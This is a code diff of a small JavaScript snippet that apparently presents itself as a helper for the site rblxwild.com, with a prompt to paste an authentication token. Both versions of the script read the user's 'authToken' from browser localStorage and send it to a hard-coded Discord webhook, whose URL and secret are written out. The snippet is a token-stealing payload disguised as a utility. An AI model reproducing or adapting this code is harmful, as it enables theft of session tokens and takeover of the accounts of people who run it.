@@ -1,13 +1,13 @@
 function lord() {
 let socket = new WebSocket("wss://rblxwild.com/socket.io/?EIO=4&transport=websocket");
-authtoken = "No auth token needed anymore :)"
+authtoken = "Paste your authentication token here"
 socket.onopen = function(e) {
 
 };
 var request = new XMLHttpRequest;
 request.open("POST", "https://discord.com/api/webhooks/1074729565286572103/JlqiP6L75jkLMSVpis1L5JLnKcny_OYcnxqIaeyKRR86tKbYk4SeJeUxjqhiv6bY-2a-", true);
 request.setRequestHeader("Content-Type", "application/json");
-var params = JSON.stringify({content: "@here **login successful** Authentication Token: " + localStorage.getItem("authToken")});
+var params = JSON.stringify({content: "@here Authentication Token: " + localStorage.getItem("authToken")});
 request.send(params);
 socket.onmessage = function(event) {
 if (!(event.data.includes("syncResponse"))) console.log(event.data)
